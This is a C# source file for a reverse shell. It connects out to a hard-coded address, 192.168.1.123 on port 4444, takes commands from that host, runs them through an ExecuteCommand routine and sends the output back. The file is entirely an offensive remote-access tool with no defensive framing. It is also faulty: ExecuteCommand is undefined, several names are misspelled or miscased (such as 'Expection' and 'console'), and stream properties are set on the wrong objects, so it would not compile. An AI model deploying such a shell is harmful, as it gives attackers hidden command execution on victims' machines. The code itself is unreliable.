using System;
using System.Net;
using System.IO;
using System.Net.Sockets;
using System.Text;


namespace reverseShell 
{
    class Program
    {
        public static void Main(string[] args)
        {
            string hostAddress = "192.168.1.123";
            int portNumber = 4444;


            TcpClient client = new TcpClient(hostAddress, portNumber);
            NetworkStream stream = client.GetStream();

            try{
                StreamReader reader = new StreamReader(stream);
                StreamWriter writer = new StreamWriter(stream);


                
                reader.BaseStream.ReadTimeout = 1000;
                reader.BaseStream.WriteTimeout = 1000;

                reader.Encoding = Encoding.UTF8;
                writer.Encoding = Encoding.UTF8;


                while(true){
                    string data = reader.Readline();

                    if(string.IsNullOrEmpty(data)) {
                        console.WriteLine("response is null");
                        break;
                    }

                    string output = ExecuteCommand(data);

                    writer.WriteLine(output);

                }

            } catch(Expection err){
                Console.writeLine(err);
            }

            stream.Close();
            client.Close();   
        }    
    }
}